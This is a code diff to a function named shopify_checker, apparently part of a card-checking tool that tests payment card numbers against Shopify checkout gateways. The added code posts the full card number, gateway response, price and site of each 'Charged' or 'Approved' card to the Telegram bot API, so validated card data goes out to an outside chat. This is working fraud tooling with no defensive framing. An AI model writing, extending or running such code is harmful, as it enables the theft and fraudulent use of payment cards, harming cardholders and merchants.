@@ -1174,10 +1174,33 @@ def shopify_checker():
         # Send Telegram notification for Charged or Approved
         if is_charged or is_approved:
             status = 'Charged' if is_charged else 'Approved'
-            asyncio.run(send_telegram_notification(
-                cc_string, clean_response, gateway, 
-                f"${price}", site, status
-            ))
+            try:
+                if status == 'Charged':
+                    emoji = "🔥"
+                    status_text = "CHARGED"
+                else:
+                    emoji = "✅"
+                    status_text = "APPROVED"
+                
+                message = f"""
+{emoji} <b>{status_text}</b> {emoji}
+
+💳 CC: <code>{cc_string}</code>
+📝 Response: {clean_response}
+🛒 Gateway: {gateway}
+💰 Price: ${price}
+🌐 Site: {site}
+⏰ Time: {__import__('datetime').datetime.now().strftime('%H:%M:%S')}
+"""
+                
+                import requests as _req
+                _req.post(
+                    f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
+                    data={'chat_id': TELEGRAM_USER_ID, 'text': message, 'parse_mode': 'HTML'},
+                    timeout=5
+                )
+            except Exception as e:
+                print(f'Telegram error: {e}')
         
         return jsonify(response_data)
         
